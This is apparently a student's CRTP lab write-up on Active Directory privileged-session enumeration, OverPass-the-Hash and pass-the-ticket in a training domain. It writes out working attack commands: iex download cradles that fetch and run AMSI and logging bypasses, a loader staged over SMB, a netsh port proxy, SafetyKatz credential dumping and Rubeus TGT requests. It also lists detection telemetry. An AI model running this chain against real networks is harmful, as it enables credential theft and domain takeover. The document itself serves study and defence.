# Domain Admin Session Enumeration & Privilege Escalation

**Date:** 24 August 2026

---

## 1. Objective

This lab demonstrates how privileged user session enumeration can reveal potential privilege-escalation paths in an Active Directory environment.

The main objectives are:

* Enumerate active user sessions across domain machines.
* Identify machines where privileged users are currently authenticated.
* Understand why privileged sessions are valuable attack-path discoveries.
* Understand the relationship between session discovery and privileged authentication.
* Study OverPass-the-Hash and Kerberos TGT-based authentication.

---

## 2. Attack-Path Mental Model

```text
Low-privileged domain user
        ↓
Session enumeration
        ↓
Find privileged session
        ↓
dcorp-mgmt → svcadmin
        ↓
Reach the machine
        ↓
Obtain privileged authentication material
        ↓
Request Kerberos TGT
        ↓
Pass the ticket
        ↓
Access resources as svcadmin
```

The important idea is that **privilege is not only about who has administrative rights, but also where those identities are currently authenticated**.

---

## 3. Session Enumeration

The lab uses `Invoke-SessionHunter` to identify active user sessions on remote machines.

### Load the script

```powershell
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

### Enumerate sessions

```powershell
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```

### Important parameters

| Parameter                            | Purpose                           |
| ------------------------------------ | --------------------------------- |
| `-NoPortScan`                        | Avoids the port-scanning portion  |
| `-RawResults`                        | Returns raw session results       |
| `select Hostname,UserSession,Access` | Displays the most relevant fields |

### Lab discovery

The important discovery was:

```text
dcorp-mgmt
    └── svcadmin
         └── Domain Admin session
```

This makes `dcorp-mgmt` an interesting host for further authorized lab investigation.

---

## 4. Why Session Enumeration Matters

Active Directory enumeration should not only answer:

> **Who has privileged access?**

It should also answer:

> **Where are privileged users currently logged in?**

For example:

```text
Server A → Normal User
Server B → Service Account
Server C → Domain Admin
```

A low-privileged account may therefore discover an escalation opportunity without initially possessing the privileges itself.

This makes **identity + location** an important concept in Active Directory security.

---

## 5. Targeted Enumeration

The lab material also demonstrates querying specific machines through a `servers.txt` file rather than blindly enumerating every available host.

Conceptually:

```text
Domain
   ↓
Identify interesting machines
   ↓
servers.txt
   ↓
Targeted session enumeration
```

Targeted enumeration is useful when studying operational security because unnecessary enumeration can generate additional network and endpoint telemetry.

---

## 6. PowerShell Logging and AMSI

The supplied training material introduces PowerShell logging and AMSI concepts.

Example lab commands include:

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.X/sbloggingbypass.txt')
```

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.X/Amsi-Byp.txt')
```

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1')
```

These should be understood as separate security mechanisms:

```text
Script Block Logging
        ↓
Records PowerShell script content

AMSI
        ↓
Provides content inspection to security products

PowerView
        ↓
Provides Active Directory enumeration functionality
```

### Key distinction

**Script Block Logging** is a PowerShell logging mechanism, whereas **AMSI** provides an inspection interface that security products can use to inspect potentially malicious content.

---

## 7. Find-DomainUserLocation

The lab also demonstrates:

```powershell
Find-DomainUserLocation
```

This can help identify where domain users are logged in and is particularly useful when investigating privileged accounts.

The lab identified:

```text
Domain Admin session
        ↓
dcorp-mgmt
```

This discovery forms the basis of the subsequent attack-path demonstration.

---

## 8. Remote Access with WinRS

The remote execution context can be verified with:

```cmd
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

This demonstrates remote command execution against the identified lab server.

Conceptually:

```text
Current User
     ↓
WinRS
     ↓
dcorp-mgmt
     ↓
Remote command execution
```

---

## 9. Staging the Loader

The supplied lab workflow stages a loader through an intermediate machine.

### Download

```powershell
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

### Copy to the target

```cmd
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Conceptually:

```text
HTTP Server
     ↓
dcorp-ci
     ↓ SMB
dcorp-mgmt
```

The important learning point is understanding how tooling can be transferred between hosts inside a controlled lab environment.

---

## 10. Port Proxy

The supplied lab workflow configures a Windows port proxy:

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

The remote version is:

```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```

Conceptually:

```text
dcorp-mgmt:8080
       ↓
172.16.100.x:80
```

From a defensive perspective, unexpected `netsh interface portproxy` configuration can be valuable telemetry because port proxies can alter network connectivity through a Windows host.

---

## 11. Privileged Credential Material

The lab uses a staged loader with SafetyKatz:

```cmd
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit
```

The key concept is:

> A privileged interactive session can result in valuable authentication material being present on an endpoint.

This is one reason privileged logons to lower-trust or broadly accessible systems should be carefully controlled.

The exact credential material from the training environment is intentionally excluded from this reusable GitHub documentation.

---

## 12. OverPass-the-Hash

**OverPass-the-Hash** is a Kerberos-oriented technique where available credential material, such as a Kerberos-compatible key, is used to obtain a Kerberos Ticket Granting Ticket (TGT).

Conceptually:

```text
Credential Material
        ↓
Request Kerberos TGT
        ↓
TGT
        ↓
Ticket Injection
        ↓
Kerberos Authentication
```

The supplied lab workflow uses Rubeus:

```cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<LAB_AES256_KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

The lab key is represented as:

```text
<LAB_AES256_KEY>
```

rather than storing the actual secret in this GitHub documentation.

### Important parameters

| Parameter        | Meaning                                     |
| ---------------- | ------------------------------------------- |
| `asktgt`         | Requests a Kerberos TGT                     |
| `/user:svcadmin` | Specifies the target account                |
| `/aes256:<key>`  | Supplies the AES-256 Kerberos key           |
| `/opsec`         | Uses OPSEC-oriented request configuration   |
| `/createnetonly` | Creates a separate logon context            |
| `/show`          | Displays the created process/context        |
| `/ptt`           | Passes the obtained ticket into the session |

---

## 13. Kerberos TGT

A **Ticket Granting Ticket (TGT)** is a Kerberos ticket used to obtain service tickets for accessing resources within the domain.

Simplified authentication flow:

```text
User / Credential
       ↓
Authentication
       ↓
TGT
       ↓
Ticket Granting Service
       ↓
Service Ticket
       ↓
Target Service
```

In the lab scenario:

```text
svcadmin credential material
        ↓
Kerberos TGT
        ↓
Ticket injected
        ↓
Kerberos authentication
        ↓
Access as svcadmin
```

This demonstrates why protecting privileged credential material is critical.

---

## 14. Verify the Context

The supplied material verifies the resulting access context with:

```cmd
winrs -r:dcorp-dc cmd /c set username
```

Conceptually:

```text
svcadmin credential material
        ↓
Request TGT
        ↓
Inject ticket
        ↓
Authenticate using Kerberos
        ↓
Access domain resources
```

The important concept is that authentication can occur using Kerberos tickets rather than simply reusing a plaintext password.

---

## 15. Complete Methodology

```text
1. Start with a low-privileged domain account
                ↓
2. Enumerate active sessions
                ↓
3. Identify privileged sessions
                ↓
4. Identify dcorp-mgmt
                ↓
5. Obtain authorized remote access
                ↓
6. Stage required lab tooling
                ↓
7. Investigate privileged authentication material
                ↓
8. Request a Kerberos TGT
                ↓
9. Pass/inject the ticket
                ↓
10. Access authorized domain resources
```

---

## 16. Detection Perspective

A SOC or blue team investigating this activity could correlate several telemetry sources.

### PowerShell

**Windows PowerShell Script Block Logging**

```text
Event ID: 4104
```

Useful for identifying suspicious PowerShell commands and script content.

### Sysmon

**Process Creation**

```text
Sysmon Event ID: 1
```

Potentially useful for identifying:

* `Loader.exe`
* PowerShell execution
* Rubeus execution
* WinRS activity
* Other unusual child processes

### Authentication

Relevant Windows authentication and Kerberos telemetry can help identify unusual authentication patterns, privileged logons, and ticket-related activity.

### Network Activity

Potential indicators include:

* SMB file transfers
* WinRM/WinRS activity
* HTTP downloads
* Unexpected connections between domain hosts
* Port-proxy configuration

### Windows Configuration

Monitor suspicious execution of:

```cmd
netsh interface portproxy
```

Unexpected port-proxy rules can indicate an attempt to alter network connectivity through a compromised host.

### Endpoint Security

EDR/AV telemetry may identify:

* Credential-access behavior
* LSASS-related activity
* Suspicious PowerShell
* Credential dumping tools
* Kerberos ticket manipulation

---

## 17. CRTP Takeaways

Don't memorize the entire command chain.

Instead, remember the reasoning process:

```text
WHO IS LOGGED IN WHERE?
          ↓
IS THAT USER PRIVILEGED?
          ↓
CAN I REACH THAT MACHINE?
          ↓
WHAT AUTHENTICATION MATERIAL EXISTS?
          ↓
CAN A KERBEROS TGT BE OBTAINED?
          ↓
CAN THAT IDENTITY ACCESS THE NEXT TARGET?
```

### Important commands

```text
Invoke-SessionHunter
Find-DomainUserLocation
```

### Important concepts

```text
Privileged Session Discovery
        ↓
Credential Material
        ↓
OverPass-the-Hash
        ↓
Kerberos TGT
        ↓
Pass-the-Ticket
```

---

## 18. Revision Questions

1. Why is session enumeration important in Active Directory?
2. What does `Invoke-SessionHunter` help discover?
3. Why is a Domain Admin session on a server valuable?
4. What role can Remote Registry play in session enumeration?
5. Why might targeted enumeration be preferable to broad enumeration?
6. What is the difference between Script Block Logging and AMSI?
7. What does `Find-DomainUserLocation` identify?
8. What does WinRS provide?
9. Why is privileged authentication material valuable?
10. What is OverPass-the-Hash?
11. What is the purpose of a Kerberos TGT?
12. What does `/ptt` mean?
13. What telemetry could a SOC use to investigate this attack path?
14. Why should privileged users avoid unnecessary interactive logons to lower-trust systems?
15. How can defenders detect suspicious Kerberos ticket activity?

---

## 19. One-Line Memory Aid

> **Find privileged sessions → reach the host → identify authentication material → obtain a Kerberos TGT → pass the ticket → move using the privileged identity.**

---

## 20. Final Takeaway

The central lesson from this lab is the relationship between **identity and location** in Active Directory.

A low-privileged user may not initially possess Domain Admin privileges. However, discovering that a privileged administrator is authenticated to a reachable machine can reveal a significant attack path.

Therefore, during AD enumeration, always ask:

```text
WHO has privileges?
```

and:

```text
WHERE are those privileged users currently logged in?
```

Understanding this relationship is fundamental to both **Active Directory penetration testing** and **defensive monitoring**.

---

## Disclaimer

This documentation describes activity performed in an **authorized CRTP/Moneycorp training environment**. The commands and techniques should only be used against systems for which explicit authorization has been obtained. Secrets, credentials, and environment-specific keys should never be committed to a public GitHub repository.
